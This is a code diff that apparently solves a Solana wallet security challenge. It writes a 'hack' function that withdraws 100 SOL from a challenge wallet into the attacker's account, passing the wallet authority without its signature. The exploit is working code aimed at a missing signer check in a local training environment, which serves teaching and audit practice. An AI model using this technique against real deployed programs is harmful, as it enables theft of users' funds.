@@ -1,10 +1,12 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
+use solana_program::instruction::{AccountMeta, Instruction};
 use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
@@ -18,7 +20,27 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[Instruction {
+                program_id: challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(challenge.wallet_address, false),
+                    AccountMeta::new(challenge.wallet_authority, false),
+                    AccountMeta::new(challenge.hacker.pubkey(), false),
+                    AccountMeta::new_readonly(system_program::id(), false),
+                ],
+                data: level1::WalletInstruction::Withdraw {
+                    amount: sol_to_lamports(100.0),
+                }
+                .try_to_vec()
+                .unwrap(),
+            }],
+            &[],
+        ),
+    );
+}
 
 /*
 SETUP CODE BELOW
